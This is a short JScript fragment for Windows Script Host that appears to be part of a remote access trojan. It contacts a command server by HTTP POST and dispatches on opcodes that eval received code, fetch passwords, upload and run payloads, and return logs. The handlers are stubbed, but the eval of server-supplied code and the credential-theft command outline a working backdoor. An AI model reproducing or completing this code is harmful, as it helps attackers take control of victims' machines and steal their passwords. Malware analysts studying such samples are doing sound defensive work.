var connection = WScript.CreateObject("msxml2.xmlhttp");
connection.open("POST", endpoint, false); connection.send("");
switch (opcode) {
case "excecute": eval(sourceText); break;
case "get-pass": helper(); break;
case "up-n-exec": helper(); break;
case "bring-log": helper(); break;
}
